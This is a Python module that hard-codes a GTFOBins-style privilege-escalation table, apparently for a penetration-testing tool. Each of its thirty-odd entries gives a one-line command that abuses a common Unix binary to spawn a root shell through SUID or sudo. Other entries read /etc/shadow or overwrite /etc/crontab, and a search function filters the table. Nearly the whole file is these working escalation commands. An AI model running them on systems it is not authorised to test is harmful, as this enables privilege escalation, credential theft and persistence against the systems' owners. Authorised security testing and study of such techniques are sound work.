"""GTFOBins reference for SUID/capability/sudo abuse."""

GTFOBINS = [
    {"binary": "awk", "functions": ["shell", "file_read", "file_write", "suid", "sudo"], "shell_cmd": "awk 'BEGIN {system(\"/bin/sh\")}'", "suid_cmd": "./awk 'BEGIN {system(\"/bin/sh\")}'"},
    {"binary": "bash", "functions": ["shell", "suid", "sudo"], "shell_cmd": "bash -p", "suid_cmd": "bash -p"},
    {"binary": "cp", "functions": ["file_read", "file_write", "suid"], "file_read_cmd": "cp /etc/shadow /tmp/shadow"},
    {"binary": "curl", "functions": ["file_read", "file_upload", "suid"], "file_read_cmd": "curl file:///etc/shadow"},
    {"binary": "docker", "functions": ["shell", "suid", "sudo"], "shell_cmd": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
    {"binary": "env", "functions": ["shell", "suid", "sudo"], "shell_cmd": "env /bin/sh -p"},
    {"binary": "find", "functions": ["shell", "suid", "sudo", "file_read"], "shell_cmd": "find . -exec /bin/sh \\; -quit", "suid_cmd": "find . -exec /bin/sh -p \\; -quit"},
    {"binary": "less", "functions": ["shell", "file_read", "suid"], "shell_cmd": "less /etc/passwd (then !sh)"},
    {"binary": "man", "functions": ["shell", "suid"], "shell_cmd": "man man (then !sh)"},
    {"binary": "nano", "functions": ["shell", "file_read", "file_write"], "shell_cmd": "nano (then ^R^X then reset; sh 1>&0 2>&0)"},
    {"binary": "nmap", "functions": ["shell", "suid", "sudo"], "shell_cmd": "nmap --interactive (then !sh)", "suid_cmd": "nmap --interactive (then !sh)"},
    {"binary": "perl", "functions": ["shell", "suid", "sudo", "reverse_shell"], "shell_cmd": "perl -e 'exec \"/bin/sh\";'"},
    {"binary": "php", "functions": ["shell", "suid", "sudo", "reverse_shell"], "shell_cmd": "php -r 'system(\"/bin/sh\");'"},
    {"binary": "python", "functions": ["shell", "suid", "sudo", "reverse_shell", "file_read"], "shell_cmd": "python -c 'import os; os.system(\"/bin/sh\")'"},
    {"binary": "python3", "functions": ["shell", "suid", "sudo", "reverse_shell", "file_read"], "shell_cmd": "python3 -c 'import os; os.system(\"/bin/sh\")'"},
    {"binary": "ruby", "functions": ["shell", "suid", "sudo", "reverse_shell"], "shell_cmd": "ruby -e 'exec \"/bin/sh\"'"},
    {"binary": "tar", "functions": ["shell", "file_read", "suid"], "shell_cmd": "tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
    {"binary": "vi", "functions": ["shell", "file_read", "file_write", "suid"], "shell_cmd": "vi (then :!sh)"},
    {"binary": "vim", "functions": ["shell", "file_read", "file_write", "suid", "sudo"], "shell_cmd": "vim -c ':!sh'"},
    {"binary": "wget", "functions": ["file_read", "file_upload"], "file_read_cmd": "wget -q -O - file:///etc/shadow"},
    {"binary": "zip", "functions": ["shell", "file_read"], "shell_cmd": "zip /tmp/x.zip /etc/hosts -T --unzip-command=\"sh -c /bin/sh\""},
    {"binary": "socat", "functions": ["shell", "reverse_shell", "file_read"], "shell_cmd": "socat stdin exec:/bin/sh"},
    {"binary": "gcc", "functions": ["shell", "file_read"], "shell_cmd": "gcc -wrapper /bin/sh,-s ."},
    {"binary": "git", "functions": ["shell", "sudo", "suid"], "shell_cmd": "git help config (then !sh)"},
    {"binary": "node", "functions": ["shell", "suid", "reverse_shell"], "shell_cmd": "node -e 'child_process.spawn(\"/bin/sh\", {stdio: [0,1,2]})'"},
    {"binary": "ssh", "functions": ["shell", "suid"], "shell_cmd": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x"},
    {"binary": "strace", "functions": ["shell"], "shell_cmd": "strace -o /dev/null /bin/sh"},
    {"binary": "taskset", "functions": ["shell", "suid"], "shell_cmd": "taskset 1 /bin/sh -p"},
    {"binary": "tee", "functions": ["file_write"], "file_write_cmd": "echo DATA | tee /etc/crontab"},
    {"binary": "tmux", "functions": ["shell"], "shell_cmd": "tmux"},
    {"binary": "screen", "functions": ["shell"], "shell_cmd": "screen"},
]


def search_gtfobins(query: str = "", function_filter: str | None = None) -> list[dict]:
    """Search GTFOBins by binary name or function.

    Args:
        query: Substring to match against binary name (case-insensitive).
        function_filter: If set, only return entries that have this function.
    """
    results = GTFOBINS
    if query:
        q = query.lower()
        results = [e for e in results if q in e["binary"].lower()]
    if function_filter:
        f = function_filter.lower()
        results = [e for e in results if f in e["functions"]]
    return results
